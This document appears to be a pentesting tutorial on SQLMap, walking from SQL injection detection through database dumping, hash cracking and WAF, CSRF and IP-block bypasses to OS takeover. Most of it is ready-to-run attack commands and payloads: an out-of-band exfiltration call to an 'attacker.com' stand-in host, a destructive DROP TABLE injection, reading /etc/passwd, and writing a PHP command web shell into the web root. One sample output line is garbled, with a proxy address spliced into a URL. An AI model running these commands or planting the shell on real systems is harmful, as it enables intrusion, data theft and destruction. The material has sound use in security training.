SQLMap is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:
- Target connection	
- Injection detection	
- Fingerprinting
- Enumeration	
- Optimization	
- Protection detection and bypass using "tamper" scripts
- Database content retrieval	
- File system access	
- Execution of the operating system (OS) commands

The installation as always:
```console
zero@pio$ sudo apt install sqlmap
```

The flag `-h` will display some helpful information.

We can see the supported SQLi with the flag `-hh`. The technique characters BEUSTQ refers to the following:
- **B**: Boolean-based blind
- **E**: Error-based
- **U**: Union query-based
- **S**: Stacked queries
- **T**: Time-based blind
- **Q**: Inline queries

Let's see some examples of SQLi:
- Boolean-based blind

```sql
AND 1=1
```

- Error-based 

```sql
AND GTID_SUBSET(@@version,0)
```

- UNION query-based

```sql
UNION ALL SELECT 1,@@version,3
```

- Stacked queries 

```sql
; DROP TABLE users
```

- Time-based blind 

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

- Inline queries 

```sql
SELECT (SELECT @@version) from
```

- Out-of-band 

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

# Basics

Taking the following code as the target page:
```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $query);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

Where the input goes in the URL. To run SQLMap take the URL with the input: `http://www.example.com/vuln.php?id=1`, and then:
```console
zero@pio$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

## Log Messages Description

The following are some of the most common messages usually found during a scan of SQLMap:

> target URL content is stable 

There are no major changes between responses in case of continuous identical requests.

> GET parameter 'id' appears to be dynamic 

It is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. In case the output is "static" and does not change, it could be an indicator that the value of the tested parameter is not processed by the target, at least in the current context.

> heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')

There was a MySQL error when SQLMap sends an intentionally invalid value was used, which indicates that the tested parameter could be SQLi injectable and that the target could be MySQL.

> heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks

SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability. 

> it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

SQLMap tests for all supported DBMSes. In case that there is a clear indication that the target is using the specific DBMS, we can narrow down the payloads to just that specific DBMS.

> for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

If there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests.

> reflective value(s) found and filtering out 

Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk.

> GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")

This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding. In the case of boolean-based blind and similar SQLi types (e.g., time-based blind), where there is a high chance of false-positives, at the end of the run, SQLMap performs extensive testing consisting of simple logic checks for removal of false-positive findings. 

> time-based comparison requires a larger statistical model, please wait........... (done)

SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses.

> automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found

UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types.

> ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test 

As a heuristic check for the UNION-query SQLi type, before the actual UNION payloads are sent, a technique known as ORDER BY is checked for usability. 

> GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

This is one of the most important messages of SQLMap, as it means that the parameter was found to be vulnerable to SQL injections. 

> sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:

Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. 

> fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'

This indicates the local file system location used for storing all logs, sessions, and output data for a specific target.

# Building Attacks 

## HTTP Request 

One of the best and easiest ways to properly set up an SQLMap request against the specific target (web with request parameters) is *Copy as cURL*. Right click on the Network (Monitor) panel. Then `ctrl + v` on our command line, replace *curl* by *sqlmap*. The command will be like:
```console
zero@pio$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

As you may know, GET parameters are provided in the URL, while POST needs to be send with the `--data` flag. For example:
```console
zero@pio$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

If we only want to test one paramater, for example `uid`, we can use the `-p` flag as `-p uid` or add a `*`:
```console
zero@pio$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

Another option is using a request file. After capture the request (for example with Burp) we can copy all the request in a file a send it with the flag `-r`. This would be a request file:
```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

The usage is as simply as:
```console
zero@pio$ sqlmap -r <req file>
```

> We can specify the parameter we want to test as before `/?id=*`
{: .prompt-tip}

If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap. For example, the flag `--cookie` to send one:
```console
zero@pio$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
zero@pio$ sqlmap --- -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

We can apply the same to options like `--host`, `--referer`, and `-A`/`--user-agent`. Also, the flag `--random-agent` select a randomly **User-agent**. This is an important switch to remember, as more and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value (`User-agent: sqlmap/1.4.9.12#dev`). The `--mobile` switch can be used to imitate the smartphone by using that same header value.

It is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g. `--cookie="id=1*"`). Also, we can specify the HTTP method with `--method`:
```console
zero@io$ sqlmap -u www.target.com --data='id=1' --method PUT
```

## Handling SQLMap Errors 

To display errors we can use the flag `--parse-errors`. If we want to store the traffic to an output file `-t`:
```console
zero@pio$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

As always, the `-v` increase the verbosity. And the `--proxy` allow us to redirect the request, for example to Burp.

## Attack Tuning

### Prefix/Suffix 

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run:
```console
zero@pio$ sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

For example if the vulnerable code is:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

The payload will be:
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

### Level/Risk 

There is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap:
- `--level` from 1-5 (default 1) extends both vectors and boundaries being used, based on their expectancy of success
- `--risk` from 1-3 (default 1) extends the used vector set based on their risk of causing problems at the target side (risk of DOS)

Also, the verbosity can be modify (for example `-v 3`). For example:
```console
zero@pio$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

### Advanced Tuning 

- Status Codes 

When dealing with a huge target response with a lot of dynamic content, subtle differences between **TRUE** and **FALSE** responses could be used for detection purposes. If the difference between TRUE and FALSE responses can be seen in the HTTP codes we can use the flag `--code`, detecting **True** responses (`--code=200`)

- Titles

If the difference between responses can be seen by inspecting the HTTP page titles, the switch `--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.

- Strings 

In case of a specific string value appearing in **TRUE** responses, while absent in **FALSE** responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value.

- Text-only 

When dealing with a lot of hidden content, such as certain HTML page behaviors tags, we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual content.

- Techniques

Specify techniques with `--technique` (for example `--technique=BEU`).

### UNION SQLi Tuning 

In some cases, UNION SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option `--union-cols`. In case that the default "dummy" filling values used by SQLMap (**NULL** and **random integer**) are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead. Also we can set it with the option `--union-from`.

# Database Enumeration 

## Basic DB Data Enumeration

These are some flags for enumeration:
- Database version banner (`--banner`)
- Current user name (`--current-user`)
- Current database name (`--current-db`)

Simply add this flags:
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

> The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context
{: .prompt-alert}

## Table Enumeration

To get the tables (`--tables`) from a specific DB (`-D <db name>`):
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

To dump (`--dump`) all the data from a table (`-T <table name>`):
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

> We can change the dump output file format with `--dump-format`
{: .prompt-tip}

## Table/Row Enumeration 

When dealing with large tables with many columns and/or rows, we can specify the columns (`-C`):
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

We can limit how much we want to see:
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## Conditional Enumeration 

If there is a requirement to retrieve certain rows based on a known WHERE condition (`--where`):
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

## Full DB Enumeration 

We can retrieve all the db with `--dump-all`. It is recommendable to skip some default tables: `--dump-all --exclude-sysdbs`.

## DB Schema Enumeration 

If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture (`--schema`):
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --schema
```

## Searching for Data 

When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest (`--search`). It is similar to the SQL operator **LIKE**:
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --search -T user 
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

## Password Enumeration and Cracking 

Once we identify a table containing passwords we can retrieve that table with the `-T` option:
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

Automatically it will crack the hashes.

## DB Users Password Enumeration and Cracking 

Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (`--passwords`):
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

> The `-all` flag with `--batch` will automatically do all the enumeration process.
{: .prompt-tip}

# Bypassing Web Application Protections 

## Anti-CSRF Token Bypass 

To bypass a CSRF token we can use the flag `--csrf-token`:
```console
zero@pio$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

## Unique Value Bypass 

In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. We can use the flag `--randomize`:
```console
zero@pio$ qlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI

URI: http://www.example.com:80/?id=1&rp=99954
URI: http://www.example.com:80/?id=1&rp=87216
URI: http://www.example.com:80/?id=9030&rp=36456
URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
```

## Calculated Parameter Bypass 

Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). We can use the flag `--eval`:
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI

URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
```

## IP Address Concealing 

f a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option `--proxy` (`--proxy="socks4://<ip>:<port>"`), where we should add a working proxy. In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`.

When Tor is installed in our machine there should be a **SOCKS4** proxy service at the local port **9050** or **9150**. By using switch `--tor`, SQLMap will automatically try to find the local port and use it appropriately. If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch `--check-tor`.

## WAF Bypass 

SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (to produce less noise), we can use switch `--skip-waf`.

## User-agent Blacklisting Bypass 

With `--random-agent` we can bypass Blacklisting of User-agent.

## Tamper Scripts 

Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called **tamper** scripts. For example, one of the most popular tamper scripts [between](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) is replacing all occurrences of greater than operator `>` with **NOT BETWEEN 0 AND #**, and the equals operator `=` with **BETWEEN # AND #**. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes. 

Tamper scripts can be chained, one after another, within the `--tamper` option (`--tamper=between,randomcase`). We can see a full list with `--list-tampers`.

## Miscellaneous Bypasses 

Chunked transfer encoding, turned on using the switch `-chunked`, which splits the POST request's body into so-called **chunks**. Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.

And **HTTP parameter pollution** (HPP), where payloads are split in a similar way as in case of `--chunked` between different same parameter named values (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).

---

# OS Exploitation 

## Checking for DBA Privileges 

Check whether we have DBA privileges with SQLMap (`--is-dba`):
```console
zero@pio$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

## Reading Local Files 

SQLMap makes it relatively easy to read local files (`--file-read`):
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd" 
```

## Writing Local Files 

In MySql, the `--secure-file-priv` configuration must be manually disabled to allow writing data into local files using the `INTO OUTFILE SQL` query. To write data into files we must use `--file-write` and `--file-dest`. Let's start creating a payload:
```console
zero@pio$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

And then write it:
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

## OS Command Execution 

Another way is with `--os-shell`:
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --os-shell
```

SQLMap defaulted to **UNION** technique to get an OS shell, we can modify it with `--technique=E` (**Error-based SQL Injection**):
```console
zero@pio$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```
